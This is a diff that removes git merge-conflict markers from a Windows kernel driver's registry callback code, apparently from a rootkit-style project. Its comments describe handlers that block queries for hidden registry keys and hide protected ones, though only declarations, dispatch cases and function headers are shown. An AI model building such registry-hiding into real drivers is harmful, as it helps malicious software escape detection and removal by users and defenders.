@@ -16,13 +16,10 @@ bool GetNameFromKeyEnumPreInfo(KEY_INFORMATION_CLASS infoClass, PVOID informatio
 bool GetNameFromValueEnumPreInfo(KEY_VALUE_INFORMATION_CLASS infoClass, PVOID information, PUNICODE_STRING keyName);
 NTSTATUS RegNtPreDeleteKeyHandler(REG_DELETE_KEY_INFORMATION* info);
 NTSTATUS RegNtPreDeleteValueKeyHandler(REG_DELETE_VALUE_KEY_INFORMATION* info);
-<<<<<<< HEAD
 NTSTATUS RegNtPreQueryKeyHandler(REG_QUERY_KEY_INFORMATION* info);
 NTSTATUS RegNtPreQueryValueKeyHandler(REG_QUERY_VALUE_KEY_INFORMATION* info);
 NTSTATUS RegNtPreQueryMultipleValueKeyHandler(REG_QUERY_MULTIPLE_VALUE_KEY_INFORMATION* info);
 NTSTATUS RegNtPreSetValueKeyHandler(REG_SET_VALUE_KEY_INFORMATION* info);
-=======
->>>>>>> 0a9676d (Pre version 0.1 (#6))
 NTSTATUS RegNtPostEnumerateKeyHandler(REG_POST_OPERATION_INFORMATION* info);
 NTSTATUS RegNtPostEnumerateValueKeyHandler(REG_POST_OPERATION_INFORMATION* info);
 
@@ -42,13 +39,6 @@ NTSTATUS OnRegistryNotify(PVOID context, PVOID arg1, PVOID arg2) {
 	UNREFERENCED_PARAMETER(context);
 	NTSTATUS status = STATUS_SUCCESS;
 
-<<<<<<< HEAD
-<<<<<<< HEAD
-=======
-	// Need to also add: PreQueryValue, PreQueryMultipleValue, SetValueKey
->>>>>>> 0a9676d (Pre version 0.1 (#6))
-=======
->>>>>>> ffc9bcf (Seperated hidden and protected registry items.)
 	switch ((REG_NOTIFY_CLASS)(ULONG_PTR)arg1) {
 	case RegNtPreDeleteKey:
 		status = RegNtPreDeleteKeyHandler(static_cast<REG_DELETE_KEY_INFORMATION*>(arg2));
@@ -56,7 +46,6 @@ NTSTATUS OnRegistryNotify(PVOID context, PVOID arg1, PVOID arg2) {
 	case RegNtPreDeleteValueKey:
 		status = RegNtPreDeleteValueKeyHandler(static_cast<REG_DELETE_VALUE_KEY_INFORMATION*>(arg2));
 		break;
-<<<<<<< HEAD
 	case RegNtPreQueryKey:
 		status = RegNtPreQueryKeyHandler(static_cast<REG_QUERY_KEY_INFORMATION*>(arg2));
 		break;
@@ -69,8 +58,6 @@ NTSTATUS OnRegistryNotify(PVOID context, PVOID arg1, PVOID arg2) {
 	case RegNtPreSetValueKey:
 		status = RegNtPreSetValueKeyHandler(static_cast<REG_SET_VALUE_KEY_INFORMATION*>(arg2));
 		break;
-=======
->>>>>>> 0a9676d (Pre version 0.1 (#6))
 	case RegNtPostEnumerateKey:
 		status = RegNtPostEnumerateKeyHandler(static_cast<REG_POST_OPERATION_INFORMATION*>(arg2));
 		break;
@@ -171,9 +158,6 @@ NTSTATUS RegNtPreDeleteValueKeyHandler(REG_DELETE_VALUE_KEY_INFORMATION* info) {
 	return status;
 }
 
-<<<<<<< HEAD
-<<<<<<< HEAD
-=======
 /*
 * Description:
 * RegNtPreQueryKeyHandler is responsible for handling registry key query and block it for hidden registry keys.
@@ -184,7 +168,6 @@ NTSTATUS RegNtPreDeleteValueKeyHandler(REG_DELETE_VALUE_KEY_INFORMATION* info) {
 * Returns:
 * @status [NTSTATUS]				   -- Whether the operation was successful or not.
 */
->>>>>>> 9da4d60 (Added function documentation, refactored code)
 NTSTATUS RegNtPreQueryKeyHandler(REG_QUERY_KEY_INFORMATION* info) {
 	RegItem regItem;
 	PCUNICODE_STRING regPath;
@@ -361,10 +344,6 @@ NTSTATUS RegNtPreSetValueKeyHandler(REG_SET_VALUE_KEY_INFORMATION* info) {
 	return status;
 }
 
-<<<<<<< HEAD
-=======
->>>>>>> 0a9676d (Pre version 0.1 (#6))
-=======
 /*
 * Description:
 * RegNtPostEnumerateKeyHandler is responsible for handling registry key enumeration and hide the protected registry keys.
@@ -375,7 +354,6 @@ NTSTATUS RegNtPreSetValueKeyHandler(REG_SET_VALUE_KEY_INFORMATION* info) {
 * Returns:
 * @status [NTSTATUS]					    -- Whether the operation was successful or not.
 */
->>>>>>> 9da4d60 (Added function documentation, refactored code)
 NTSTATUS RegNtPostEnumerateKeyHandler(REG_POST_OPERATION_INFORMATION* info) {
 	HANDLE key;
 	PVOID tempKeyInformation;
